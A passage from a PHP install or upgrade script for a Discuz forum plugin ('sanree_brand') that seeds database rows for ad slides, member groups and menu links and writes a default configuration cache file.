('$installlang[jubao]', 'plugin.php?id=sanree_brand&mod=msg&bid={bid}&type=3', 0, 1, 1, 0, 1344828662, 1, 1, 0);

EOF;
runquery($addsql1);
}

if ($pv*1000<1211) {
$addsql = <<<EOF
INSERT INTO `pre_sanree_brand_slide` (`pic1`, `movie1`, `pic2`, `movie2`, `pic3`, `movie3`, `pic4`, `movie4`, `pic5`, `movie5`, `movie11`, `movie22`, `movie33`, `movie44`, `movie55`) VALUES
('{pluginimg}/ad1.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad2.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad3.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad4.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad5.jpg', 'http://www.fx8.cc/', NULL, NULL, NULL, NULL, NULL);
INSERT INTO `pre_sanree_brand_group` (`groupname`, `grouplogo`, `dateline`, `isuse`, `adminid`, `urlmod`) VALUES
('vip0', '{pluginimg}/vip0.gif', 1344610027, 1, 1, 0),
('vip1', '{pluginimg}/vip1.gif', 1344517322, 1, 1, 1);
INSERT INTO `pre_sanree_brand_cmenu` (`title`, `url`, `sort`, `displayorder`, `clicks`, `uid`, `dateline`, `status`, `window`, `istop`) VALUES
('$installlang[favorite]', 'home.php?mod=spacecp&ac=favorite&type=thread&id={tid}', 0, 0, 1, 0, 1344828567, 1, 1, 0),
('$installlang[share]', 'home.php?mod=spacecp&ac=share&type=thread&id={tid}', 0, 1, 1, 0, 1344828662, 1, 1, 0);
EOF;
runquery($addsql);
}
	save_syscache('sanree_brand_category', '');
	save_syscache('sanree_brand_subcategory', '');
	save_syscache('sanree_brand_usercate', '');
	save_syscache('sanree_brand_admincate', '');

$bodystyle= array();
$bodystyle['isuse'] = 0;
$bodystyle['ishideheader'] = 1;
$bodystyle['notbackimg'] = 0;
$bodystyle['backgroundcolor'] = '#FFFFFF'; 
$bodystyle['backgroundattachment'] = '';
$bodystyle['backgroundrepeat'] = ''; 
$bodystyle['backgroundpositionx'] = '';
$bodystyle['backgroundpositiony'] = '';
$moduledata=array('allowalbum' => 1,'allowfastpost' => 1, 'allowmultiple' => 0, 'bodystyle' => $bodystyle);

$contents= "<?php\r//Sanree cache file, DO NOT modify me!\r    $"."branddefault='".serialize($moduledata)."';\r?>";
$modfile=DISCUZ_ROOT.'./data/sysdata/cache_sanree_brand_config.php';
if (!file_exists($modfile)) {
	srsysfilecache($contents, "sanree_brand_config.php");
}
	
$finish = TRUE;
?>